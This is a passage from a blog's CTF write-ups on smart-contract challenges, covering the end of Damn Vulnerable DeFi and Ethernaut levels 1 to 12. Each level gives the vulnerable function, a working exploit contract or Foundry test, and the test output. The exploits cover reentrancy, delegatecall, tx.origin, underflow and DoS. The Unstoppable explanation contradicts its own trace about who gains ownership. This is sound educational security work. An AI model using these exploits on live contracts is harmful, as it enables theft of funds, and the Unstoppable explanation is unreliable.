    <span class="s">│   │   │   ├─ emit Approval(owner</span><span class="na">: TrusterLenderPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264</span><span class="pi">]</span><span class="err">,</span> <span class="na">spender: TrusterExploiter</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000000000 [1e24])</span>
    <span class="s">│   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   ├─ [802] DamnValuableToken::balanceOf(TrusterLenderPool: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]</span>
    <span class="s">│   │   │   └─ ← [Return] 1000000000000000000000000 [1e24]</span>
    <span class="s">│   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   ├─ [29354] DamnValuableToken::transferFrom(TrusterLenderPool: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], recovery</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x73030B99950fB19C6A813465E58A0BcA5487FBEa</span><span class="pi">]</span><span class="err">,</span> <span class="s">1000000000000000000000000 [1e24])</span>
    <span class="s">│   │   ├─ emit Transfer(from</span><span class="na">: TrusterLenderPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: recovery</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x73030B99950fB19C6A813465E58A0BcA5487FBEa</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000000000 [1e24])</span>
    <span class="s">│   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   └─ ← [Return] 21 bytes of code</span>
    <span class="s">├─ [0] VM::stopPrank()</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [0] VM::getNonce(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] </span><span class="m">1</span>
    <span class="s">├─ [0] VM::assertEq(1, 1, "Player executed more than one tx") [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [802] DamnValuableToken::balanceOf(TrusterLenderPool: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] </span><span class="m">0</span>
    <span class="s">├─ [0] VM::assertEq(0, 0, "Pool still has tokens") [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [802] DamnValuableToken::balanceOf(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] 1000000000000000000000000 [1e24]</span>
    <span class="s">├─ [0] VM::assertEq(1000000000000000000000000 [1e24], 1000000000000000000000000 [1e24], "Not enough tokens in recovery account") [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">└─ ← [Stop]</span>

<span class="na">Suite result</span><span class="pi">:</span> <span class="s">ok. 1 passed; 0 failed; 0 skipped; finished in 27.70ms (4.16ms CPU time)</span>

</code></pre></div></div>

<hr />

<h1 id="unstoppable-challenge">Unstoppable Challenge</h1>

<h2 id="challenge-overview-6">Challenge Overview</h2>
<p>This challenge involves exploiting a flashloan vulnerability in the UnstoppableVault contract. The vault offers flash loans with a fee and allows the owner to pause the contract and execute arbitrary changes. The goal is to exploit the flashloan mechanism, triggering an unwanted state change.</p>

<h2 id="smart-contract-breakdown-1">Smart Contract Breakdown</h2>

<h3 id="important-state-variables">Important State Variables</h3>
<ul>
  <li><code class="language-plaintext highlighter-rouge">FEE_FACTOR</code>: The fee for flashloans (5%).</li>
  <li><code class="language-plaintext highlighter-rouge">GRACE_PERIOD</code>: The period after which the flashloan fee changes.</li>
  <li><code class="language-plaintext highlighter-rouge">feeRecipient</code>: The address to which the flashloan fees are sent.</li>
  <li><code class="language-plaintext highlighter-rouge">end</code>: The timestamp that determines the end of the grace period.</li>
</ul>

<h3 id="critical-functions">Critical Functions</h3>
<ul>
  <li><strong><code class="language-plaintext highlighter-rouge">maxFlashLoan</code></strong>: Returns the maximum amount for a flashloan based on the total assets in the vault.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">flashFee</code></strong>: Calculates the fee for the flashloan.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">flashLoan</code></strong>: Executes the flashloan by transferring tokens, calling the borrower’s callback, and ensuring the correct fee is returned.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">execute</code></strong>: Allows the owner to execute arbitrary changes when the contract is paused.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">setPause</code></strong>: Pauses or unpauses the vault.</li>
</ul>

<h3 id="️-potential-vulnerability">⚠️ Potential Vulnerability</h3>
<p>The vault is vulnerable to a <strong>Denial of Service (DoS) attack</strong> via the flashloan function. An attacker can trigger a failure in the <code class="language-plaintext highlighter-rouge">flashLoan</code> function, causing the vault to enter a paused state and preventing further flashloans.</p>

<h2 id="vulnerability-explained-1">Vulnerability Explained</h2>
<p>The vulnerability occurs when the <code class="language-plaintext highlighter-rouge">flashLoan</code> function fails due to an invalid state (e.g., an incorrect balance). If this happens, the vault is paused, and ownership is transferred to the attacker. This results in the vault being stuck in a paused state, rendering the flashloan feature unusable.</p>

<h2 id="exploit-strategy-5">Exploit Strategy</h2>
<ol>
  <li><strong>FlashLoan Attack</strong>: The attacker initiates a flashloan with an invalid amount or token to trigger the revert condition in the <code class="language-plaintext highlighter-rouge">flashLoan</code> function.</li>
  <li><strong>Vault Pause</strong>: Upon failure, the vault enters a paused state, preventing any further flashloans.</li>
  <li><strong>Ownership Transfer</strong>: The attacker gains control of the vault by transferring ownership, allowing them to alter the contract or withdraw funds.</li>
</ol>

<h2 id="exploit-code-solidity-1">Exploit Code (Solidity)</h2>

<pre><code class="language-solidity">function test_unstoppable() public checkSolvedByPlayer {
    // DOS attack by using an external call to the vault to stop the flashloan
    token.transfer(address(vault), 2);
}
</code></pre>
<h3 id="proof-of-exploit-7">Proof of exploit</h3>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">Ran 1 test for test/unstoppable/Unstoppable.t.sol:UnstoppableChallenge</span>
<span class="pi">[</span><span class="nv">PASS</span><span class="pi">]</span> <span class="na">test_unstoppable() (gas</span><span class="pi">:</span> <span class="s">74607)</span>
<span class="na">Traces</span><span class="pi">:</span>
  <span class="pi">[</span><span class="nv">74607</span><span class="pi">]</span> <span class="s">UnstoppableChallenge::test_unstoppable()</span>
    <span class="s">├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], player</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x44E97aF4418b7a17AABD8090bEA0A471a366305C</span><span class="pi">]</span><span class="s">)</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [13251] DamnValuableToken::transfer(UnstoppableVault: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], 2)</span>
    <span class="s">│   ├─ emit Transfer(from</span><span class="na">: player</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x44E97aF4418b7a17AABD8090bEA0A471a366305C</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: UnstoppableVault</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">2)</span>
    <span class="s">│   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">├─ [0] VM::stopPrank()</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [0] VM::prank(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946])</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [0] VM::expectEmit()</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ emit FlashLoanStatus(success</span><span class="err">:</span> <span class="kc">false</span><span class="s">)</span>
    <span class="s">├─ [33550] UnstoppableMonitor::checkFlashLoan(100000000000000000000 [1e20])</span>
    <span class="s">│   ├─ [593] UnstoppableVault::asset() [staticcall]</span>
    <span class="s">│   │   └─ ← [Return] DamnValuableToken</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span>
    <span class="s">│   ├─ [9016] UnstoppableVault::flashLoan(UnstoppableMonitor: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], DamnValuableToken</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">100000000000000000000 [1e20], 0x)</span>
    <span class="s">│   │   ├─ [802] DamnValuableToken::balanceOf(UnstoppableVault: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]</span>
    <span class="s">│   │   │   └─ ← [Return] 1000000000000000000000002 [1e24]</span>
    <span class="s">│   │   ├─ [802] DamnValuableToken::balanceOf(UnstoppableVault: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]</span>
    <span class="s">│   │   │   └─ ← [Return] 1000000000000000000000002 [1e24]</span>
    <span class="s">│   │   └─ ← [Revert] InvalidBalance()</span>
    <span class="s">│   ├─ emit FlashLoanStatus(success</span><span class="err">:</span> <span class="kc">false</span><span class="s">)</span>
    <span class="s">│   ├─ [9287] UnstoppableVault::setPause(true)</span>
    <span class="s">│   │   ├─ emit Paused(account</span><span class="na">: UnstoppableMonitor</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="s">)</span>
    <span class="s">│   │   └─ ← [Stop]</span>
    <span class="s">│   ├─ [5379] UnstoppableVault::transferOwnership(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946])</span>
    <span class="na">│   │   ├─ emit OwnershipTransferred(previousOwner: UnstoppableMonitor</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">newOwner: deployer</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span><span class="s">)</span>
    <span class="s">│   │   └─ ← [Stop]</span>
    <span class="s">│   └─ ← [Stop]</span>
    <span class="s">├─ [518] UnstoppableVault::paused() [staticcall]</span>
    <span class="s">│   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">├─ [0] VM::assertTrue(true, "Vault is not paused") [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [573] UnstoppableVault::owner() [staticcall]</span>
    <span class="s">│   └─ ← [Return] deployer</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span>
    <span class="s">├─ [0] VM::assertEq(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], deployer</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span><span class="err">,</span> <span class="s2">"</span><span class="s">Vault</span><span class="nv"> </span><span class="s">did</span><span class="nv"> </span><span class="s">not</span><span class="nv"> </span><span class="s">change</span><span class="nv"> </span><span class="s">owner") [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">└─ ← [Stop]</span>

<span class="na">Suite result</span><span class="pi">:</span> <span class="s">ok. 1 passed; 0 failed; 0 skipped; finished in 7.19ms (895.44µs CPU time)</span>

<span class="na">Ran 1 test suite in 2.46s (7.19ms CPU time)</span><span class="pi">:</span> <span class="s">1 tests passed, 0 failed, 0 skipped (1 total tests)</span>
</code></pre></div></div>

<hr />
<p><strong>*Next Challenge update soon!!</strong></p>]]></content><author><name></name></author><category term="writeups" /><category term="ctfs" /><category term="blockchain" /><summary type="html"><![CDATA[GITHUB: View]]></summary></entry><entry><title type="html">Ethernaut Challenges</title><link href="https://block-programr.github.io/writeups/2025/04/25/Ethernaut.html" rel="alternate" type="text/html" title="Ethernaut Challenges" /><published>2025-04-25T00:00:00+00:00</published><updated>2025-04-25T00:00:00+00:00</updated><id>https://block-programr.github.io/writeups/2025/04/25/Ethernaut</id><content type="html" xml:base="https://block-programr.github.io/writeups/2025/04/25/Ethernaut.html"><![CDATA[<h1 id="ethernaut-challenges">Ethernaut Challenges</h1>

<p><strong>GitHub</strong>: <a href="https://github.com/SCATERLABs/CTFs/tree/0465130a63d25a8078a39b3241c9a8c7e101b7f1/EthernautChallenges">View</a></p>

<h2 id="level-1-hello-ethernaut">Level 1: Hello Ethernaut</h2>

<h3 id="vulnerable-function">Vulnerable Function</h3>
<pre><code class="language-solidity">function authenticate(string memory passkey) public {
    if (
        keccak256(abi.encodePacked(passkey)) ==
        keccak256(abi.encodePacked(password))
    ) {
        cleared = true;
    }
}
</code></pre>

<p><strong>Vulnerability</strong>: The <code class="language-plaintext highlighter-rouge">password</code> variable is marked as <code class="language-plaintext highlighter-rouge">public</code>, which allows anyone to call <code class="language-plaintext highlighter-rouge">.password()</code> and get the secret directly.</p>

<h3 id="exploit-test">Exploit Test</h3>
<pre><code class="language-solidity">function test_pass_attack() public {
    vm.startPrank(attacker);
    assertEq(resultpass, instance.password(), "password failed");

}

function test_attack() public {
    vm.startPrank(attacker);

    string memory result = instance.info();
    result = instance.info1();
    result = instance.info2("hello");
    result = instance.info42();
    result = instance.method7123949();

    instance.authenticate(password);

    bool cleared = instance.getCleared();
    assertTrue(cleared, "Authentication failed");
    vm.stopPrank();
}
</code></pre>

<hr />

<h2 id="level-2-fallback">Level 2: Fallback</h2>

<h3 id="vulnerable-function-1">Vulnerable Function</h3>
<pre><code class="language-solidity">receive() external payable {
    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);
    owner = msg.sender;
}
</code></pre>

<p><strong>Vulnerability</strong>: The fallback function allows any contributor to become the <code class="language-plaintext highlighter-rouge">owner</code> by sending ETH directly to the contract. The original <code class="language-plaintext highlighter-rouge">owner</code> logic is also flawed—it can be overtaken easily by minimal contributions.</p>

<h3 id="exploit-test-1">Exploit Test</h3>
<pre><code class="language-solidity">function test_attack() public {
    vm.startPrank(attacker);
    _fallback.contribute{value: 0.0001 ether}();

    (bool success, ) = address(_fallback).call{value: 0.001 ether}("");
    require(success, "Fallback call failed");

    assertEq(_fallback.owner(), attacker, "Attacker is not the owner after fallback");
}

function test_withdraw() public {
    vm.startPrank(attacker2);
    _fallback.contribute{value: 0.0001 ether}();
    _fallback.contribute{value: 0.0001 ether}();
    vm.stopPrank();

    vm.startPrank(attacker);
    _fallback.contribute{value: 0.0001 ether}();
    (bool success, ) = address(_fallback).call{value: 0.001 ether}("");
    require(success, "Fallback call failed");

    uint256 balanceBefore = address(_fallback).balance;
    _fallback.withdraw();

    assertTrue(attacker.balance &gt;= balanceBefore, "Attacker did not receive the funds");
    assertTrue(address(_fallback).balance == 0, "Contract balance is not zero after withdraw");
    vm.stopPrank();
}
</code></pre>

<hr />

<h2 id="level-3-fallout">Level 3: Fallout</h2>

<h3 id="vulnerable-function-2">Vulnerable Function</h3>
<pre><code class="language-solidity">function Fal1out() public payable {
    owner = payable(msg.sender);
    allocations[owner] = msg.value;
}
</code></pre>

<p><strong>Vulnerability</strong>: The function <code class="language-plaintext highlighter-rouge">Fal1out()</code> is incorrectly named. It looks like a constructor but is actually a public function. Anyone can call it and become the <code class="language-plaintext highlighter-rouge">owner</code>.</p>

<h3 id="exploit-test-2">Exploit Test</h3>
<pre><code class="language-solidity">function test_attack() public {
    vm.startPrank(attacker2);
    _fallout.allocate{value: 2 ether}();
    vm.stopPrank();

    vm.startPrank(attacker);
    _fallout.Fal1out{value: 2 ether}();
    _fallout.collectAllocations();

    assertTrue(address(_fallout).balance == 0, "attacker balance should be 0");
    vm.stopPrank();
}
</code></pre>

<hr />

<h2 id="level-4-coinflip">Level 4: CoinFlip</h2>

<h3 id="vulnerable-function-3">Vulnerable Function</h3>
<pre><code class="language-solidity">function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
        revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
        consecutiveWins++;
        return true;
    } else {
        consecutiveWins = 0;
        return false;
    }
}
</code></pre>

<p><strong>Vulnerability</strong>: Uses predictable <code class="language-plaintext highlighter-rouge">blockhash</code> to generate randomness. The attacker can precompute the same value and always win the flip.</p>

<h3 id="exploit-test-3">Exploit Test</h3>
<pre><code class="language-solidity">function test_attack() public {
    vm.startPrank(attacker);

    for (uint256 i = 0; i &lt; 10; i++) {
        vm.roll(block.number + 1);
        coinFlipAttack.attack();
    }

    assertEq(
        coinFlip.consecutiveWins(),
        10,
        "Attack failed to reach 10 wins"
    );

    vm.stopPrank();
}
</code></pre>

<hr />

<h2 id="level-5-telephone">Level 5: Telephone</h2>

<h3 id="vulnerable-function-4">Vulnerable Function</h3>
<pre><code class="language-solidity">function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
        owner = _owner;
    }
}
</code></pre>

<p><strong>Vulnerability</strong>: The contract uses <code class="language-plaintext highlighter-rouge">tx.origin</code> instead of <code class="language-plaintext highlighter-rouge">msg.sender</code> for access control. An attacker can create a contract that calls this function, with the <code class="language-plaintext highlighter-rouge">tx.origin</code> being a user (player), and <code class="language-plaintext highlighter-rouge">msg.sender</code> being the attack contract. This bypasses the condition and changes the ownership.</p>

<h3 id="exploit-test-4">Exploit Test</h3>
<pre><code class="language-solidity">function test_attack() public {
    vm.startPrank(attacker);
    telephone.changeOwner(attacker);
    assertEq(telephone.owner(), attacker, "attacker should be the owner");
    vm.stopPrank();
}

function test_attack2() public {
    vm.startPrank(player);
    TelephoneExploit exploit = new TelephoneExploit(telephone);
    exploit.attack(attacker);
    assertEq(telephone.owner(), attacker, "attacker should be the owner");
    vm.stopPrank();
}
</code></pre>

<hr />

<h2 id="level-6delegation">Level 6:Delegation</h2>

<h3 id="vulnerable-function-5">Vulnerable Function</h3>

<pre><code class="language-solidity">fallback() external {
    (bool result, ) = address(delegate).delegatecall(msg.data);
    if (result) {
        this;
    }
}
</code></pre>

<p><strong>Vulnerability</strong>: The Delegation contract uses delegatecall to execute code from the Delegate contract within the context of its own storage. This means an attacker can call a function like pwn() on Delegation, which executes pwn() in Delegate and updates the owner of Delegation, not Delegate.</p>

<h3 id="exploit-test-5">Exploit Test</h3>
<pre><code class="language-solidity">function test_attack() public {
    vm.startPrank(attacker);
    (bool success, ) = address(delegation).call(
        abi.encodeWithSignature("pwn()")
    );
    require(success, "Call failed");
    assertEq(delegation.owner(), attacker, "Attacker is not the owner");
    vm.stopPrank();
}

</code></pre>
<hr />

<h2 id="level-7force">Level 7:Force</h2>

<h3 id="vulnerable-function-6">Vulnerable Function</h3>

<pre><code class="language-solidity">// Force contract has no receive/fallback or payable function
contract Force {
   
}
</code></pre>

<p><strong>Vulnerability</strong>: Ether can still be forcibly sent using selfdestruct.</p>

<h3 id="exploit-contract-forcedestruct">Exploit Contract (ForceDestruct)</h3>
<pre><code class="language-solidity"> contract ForceDestruct {
    function attack(address payable _contract) public payable {
        selfdestruct(_contract);
    }
}

</code></pre>

<h3 id="exploit-test-6">Exploit Test</h3>
<pre><code class="language-solidity">    function test_attack() public {
    vm.startPrank(attacker);
    forceDestruct = new ForceDestruct();
    forceDestruct.attack{value: 1 ether}(payable(address(force)));
    assertEq(address(force).balance, 1 ether, "Force contract did not receive Ether");
    vm.stopPrank();
    }

</code></pre>
<h3 id="test-output">Test Output</h3>
<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[PASS] test_attack() (gas: 131011)
Traces:
  [131011] level7Test::test_attack()
    ├─ VM::startPrank(attacker)
    ├─ new ForceDestruct
    ├─ ForceDestruct::attack{value: 1 ether}(Force)
    │   └─ [SelfDestruct]
    ├─ assertEq(1 ether, 1 ether)
    └─ VM::stopPrank()

Suite result: ok. 1 passed; 0 failed; finished in 6.73ms
</code></pre></div></div>
<hr />

<h2 id="level-8valut">Level 8:Valut</h2>

<h3 id="vulnerable-function-7">Vulnerable Function</h3>

<pre><code class="language-solidity"> bool public locked;//storage slot0
 bytes32 private password;//storage slot1
function unlock(bytes32 _password) public {
    if (password == _password) {
        locked = false;
    }
}

</code></pre>

<p><strong>Vulnerability</strong>: Although password is marked as private, all contract storage is publicly accessible. In Solidity, the private keyword only restricts access within the Solidity language, not from the blockchain level. So, the password stored at storage slot 1 can be retrieved using vm.load.</p>

<h3 id="exploit-test-7">Exploit Test</h3>
<pre><code class="language-solidity">   function test_attack() public {
    vm.startPrank(attacker);
    // Get the password from storage slot 1
    bytes32 _password = vm.load(address(vault), bytes32(uint256(1)));
    vault.unlock(_password);
    assertFalse(vault.locked());
    vm.stopPrank();
}
</code></pre>
<h3 id="test-output-1">Test Output</h3>
<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[PASS] test_attack() (gas: 11812)
Traces:
  [16612] VaultTest::test_attack()
    ├─ VM::startPrank(attacker)
    ├─ VM::load(Vault, slot 1)
    ├─ Vault::unlock(password)
    ├─ Vault::locked() → false
    ├─ VM::assertFalse(false)
    └─ VM::stopPrank()

Suite result: ok. 1 passed; 0 failed; finished in 1.24ms
</code></pre></div></div>
<hr />

<h2 id="level-9token">Level 9:Token</h2>

<h3 id="vulnerable-function-8">Vulnerable Function</h3>

<pre><code class="language-solidity"> function transfer(address _to, uint256 _value) public returns (bool) {
    unchecked {
        require(balances[msg.sender] - _value &gt;= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
    }
    return true;
}
</code></pre>

<p><strong>Vulnerability</strong>: The transfer() function is written with an unchecked block, allowing underflow to occur. When a user transfers more tokens than they own, the subtraction balances[msg.sender] -= _value underflows and wraps around to a massive value (2**256 - x), resulting in an increased balance instead of failing.</p>

<p>Note: This kind of underflow attack was possible before Solidity 0.8.x, which introduced built-in overflow/underflow protection.
To demonstrate this vulnerability in a controlled environment, unchecked is intentionally used to bypass that protection for educational purposes</p>

<h3 id="exploit-test-8">Exploit Test</h3>
<pre><code class="language-solidity">   function test_attack() public {
    vm.startPrank(player);
    
    // Initial balance of player: 20 tokens
    assertEq(token.balanceOf(player), 20);

    // Transfer more than balance (21 tokens), triggers underflow
    bool success = token.transfer(attacker, 21);
    assertTrue(success);

    // Player's balance underflows to a very large number
    uint256 _balanceofplayer = token.balanceOf(player);
    assertGt(_balanceofplayer, 20);

    vm.stopPrank();
}
</code></pre>
<h3 id="test-output-2">Test Output</h3>
<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[PASS] test_attack() (gas: 47312)
Traces:
  [47312] TokenTest::test_attack()
    ├─ VM::startPrank(player)
    ├─ Token::balanceOf(player) → 20
    ├─ assertEq(20, 20)
    ├─ Token::transfer(attacker, 21) → true
    ├─ assertTrue(true)
    ├─ Token::balanceOf(player) → 1.157e77
    ├─ assertGt(1.157e77, 20)
    └─ VM::stopPrank()

Suite result: ok. 1 passed; 0 failed; finished in 988.39µs
</code></pre></div></div>
<hr />

<h2 id="level-10king">Level 10:King</h2>
<p><strong>AttackDesc</strong>:
A Denial of Service (DoS) attack is when someone makes a smart contract stop working for others.
This usually happens if the contract sends Ether to a malicious address that always fails or reverts.
If one function fails because of this, others may not be able to use the contract.
In the King level, a smart contract becomes the king and blocks future kings by rejecting ETH.
This locks the contract and nobody else can play the game.
DoS attacks make the contract unusable for honest users.</p>

<h3 id="vulnerable-function-9">Vulnerable Function</h3>

<pre><code class="language-solidity">receive() external payable {
    require(msg.value &gt;= prize || msg.sender == owner);
    payable(king).transfer(msg.value); // vulnerable to DoS
    king = msg.sender;
    prize = msg.value;
}

</code></pre>

<p><strong>Vulnerability</strong>: The transfer call to the current king can fail if the king is a contract that reverts on receiving ETH. This leads to a Denial of Service (DoS) where no one can become king anymore.</p>

<h3 id="exploit-contract">Exploit Contract</h3>
<pre><code class="language-solidity"> contract Attacker {
    King public king;

    constructor(King _King) {
        king = _King;
    }

    function attack() public payable {
        require(msg.value &gt;= address(king).balance, "Not enough balance");
        (bool success, ) = address(king).call{value: msg.value}("");
        require(success, "transfer failed");
    }

    receive() external payable {
        revert("sent eth failed"); // Reverts to block
    }
}
</code></pre>

<h3 id="exploit-test-9">Exploit Test</h3>
<pre><code class="language-solidity">   function test_attack() public {
    vm.prank(attackerEOA);
    attack.attack{value: 2 ether}(); // attacker becomes king

    assertEq(king._king(), address(attack)); //  attacker is king

    vm.prank(player);
    (bool success, ) = address(king).call{value: 3 ether}(""); // another player tries
    assertFalse(success, "Player should not be able to become king anymore"); //  fails
}
</code></pre>
<h3 id="test-output-3">Test Output</h3>
<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[PASS] test_attack() (gas: 71672)
Traces:
  [71672] KingTest::test_attack()
    ├─ VM::prank(attackerEOA)
    ├─ Attacker::attack{value: 2 ether}()
    │   ├─ King::receive{value: 2 ether}()
    │   │   ├─ player::fallback{value: 2 ether}()
    │   │   └─ [Stop]
    │   └─ [Stop]
    ├─ King::_king() → Attacker
    ├─ VM::assertEq(Attacker, Attacker)
    ├─ VM::prank(player)
    ├─ King::receive{value: 3 ether}()
    │   ├─ Attacker::receive{value: 3 ether}() → [Revert] sent eth failed
    │   └─ [Revert]
    ├─ VM::assertFalse(false, "Player should not be able to become king anymore")
    └─ [Stop]

Suite result: ok. 1 passed; 0 failed; finished in 15.46ms
</code></pre></div></div>
<hr />

<h2 id="level-11reentrancy">Level 11:Reentrancy</h2>
<p><strong>AttackDesc</strong>:
This is a reentrancy attack, where the attacker recursively calls the withdraw function within the fallback/receive function before the contract’s state is updated, allowing them to drain all the funds.</p>

<h3 id="vulnerable-function-10">Vulnerable Function</h3>

<pre><code class="language-solidity">function withdraw(uint256 _amount) public {
    if (balances[msg.sender] &gt;= _amount) {
        (bool result, ) = msg.sender.call{value: _amount}("");
        if (result) {
            _amount;
        }
        balances[msg.sender] -= _amount;
    }
}
</code></pre>

<p><strong>Vulnerability</strong>: 
 The contract sends ETH to msg.sender using .call before updating the internal state balances[msg.sender].
This allows an attacker to recursively call withdraw() in the fallback/receive function before their balance is updated.
Because of this, the same balance can be withdrawn multiple times, draining the entire contract balance</p>

<h3 id="exploit-contract-1">Exploit Contract</h3>
<pre><code class="language-solidity"> contract Attack {
    Reentrance public reentrance;

    constructor(Reentrance _reentrance) {
        reentrance = _reentrance;
    }

    function attack() external payable {
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);
    }

    receive() external payable {
        uint256 bal = reentrance.balanceOf(address(this));
        if (address(reentrance).balance &gt; 0 &amp;&amp; bal &gt; 0) {
            uint256 toWithdraw = bal &lt; 1 ether ? bal : 1 ether;
            reentrance.withdraw(toWithdraw);
        }
    }
}
</code></pre>

<h3 id="exploit-test-10">Exploit Test</h3>
<pre><code class="language-solidity">  function test_attack() public {
    vm.startPrank(attacker);
    MaliciousContract malicious = new MaliciousContract(reentrance);
    uint256 balanceBefore = address(malicious).balance;
    uint256 _reentrantbalance = address(reentrance).balance;

    vm.expectRevert("arithmetic underflow or overflow");
    malicious.attack{value: 1 ether}();
    
    assertEq(address(reentrance).balance, 0);
    assertEq(address(malicious).balance, balanceBefore + _reentrantbalance);
    vm.stopPrank();
}
</code></pre>
<h3 id="test-output-4">Test Output</h3>
<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Logs:
  balance of the contract before 1000000000000000000
  successfully donated
  balance of reentrance:  2000000000000000000
  balance of this contract:  0

Traces:
  ...
  ├─ Reentrance::withdraw(1 ether)
  │   ├─ MaliciousContract::receive()
  │   │   ├─ Reentrance::balanceOf()
  │   │   └─ Reentrance::withdraw(1 ether)
  │   │       ├─ MaliciousContract::receive() &lt;== RECURSIVE CALL
  │   │       └─ Revert: panic: arithmetic underflow or overflow (0x11)
</code></pre></div></div>
<h3 id="recommended-mitigation">🔒Recommended Mitigation</h3>
<p>Use the Checks-Effects-Interactions pattern to prevent reentrancy:</p>
<pre><code class="language-solidity">  function withdraw(uint256 _amount) public {
    require(balances[msg.sender] &gt;= _amount, "Insufficient balance");

    //  Effect: update state before interaction
    balances[msg.sender] -= _amount;

    // Interaction: external call after state change
    (bool success, ) = msg.sender.call{value: _amount}("");
    require(success, "Transfer failed");
}

</code></pre>
<hr />
<h2 id="level-12-elevator">Level 12: Elevator</h2>
<p><strong>AttackDesc</strong>:
The Elevator contract relies on an external Building contract to determine whether a floor is the last floor or not using the isLastFloor function.
However, it makes two separate calls to this function and does not expect the return values to differ between them.</p>

<p>This allows an attacker to manipulate the response by returning different values in consecutive calls, thus tricking the contract into thinking it has reached the top floor.</p>

<h3 id="vulnerable-function-11">Vulnerable Function</h3>

<pre><code class="language-solidity">function goTo(uint256 _floor) public {
    Building building = Building(msg.sender);

    if (!building.isLastFloor(_floor)) {
        floor = _floor;
        top = building.isLastFloor(floor);
    }
}
</code></pre>

<p><strong>Vulnerability</strong>: 
 The contract calls isLastFloor() twice: once for the check, and once to set the top state.</p>

